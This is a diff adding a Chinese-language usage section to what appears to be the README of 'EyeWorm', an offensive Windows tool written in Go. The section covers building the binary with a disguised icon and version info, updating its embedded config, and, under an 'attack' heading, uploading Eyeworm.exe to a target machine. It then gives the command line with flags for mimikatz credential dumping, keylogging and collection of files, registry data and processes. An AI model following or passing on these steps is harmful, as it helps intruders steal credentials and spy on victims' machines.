@@ -76,3 +76,30 @@
             "DeCryptCommand": null                                //保留字  解密命令 （todo）
             
         },`
+           
+## 使用
+
+### 编译
+进入 PackSource 中，配置好ico，EyeConfig.json，versioninfo.json，main.manifest 四个文件 运行PackSource.go 得到 main.syso 在EyeWorm目录下
+
+
+回到EyeWorm目录下，go build 
+
+### 更新配置文件
+由于配置文件是内嵌go中的，防止重复编译麻烦，提供UpdateSource更新内嵌的EyeConfig.json 配置文件
+
+
+修改好EyeConfig.json
+
+
+编译UpdateSource中内容，得到更新工具UpdateSource.exe
+
+
+使用`UpdateSource.exe -File=Eyeworm.exe -Data=EyeConfig.json`  即可更新
+
+
+### 攻击
+Eyeworm.exe上传在目标机器上执行对应命令
+例：`Eyeworm.exe -wfile -wcommand -wprocess -wregistry -wrecent -wmimikatz -keylog -redeye`
+
+
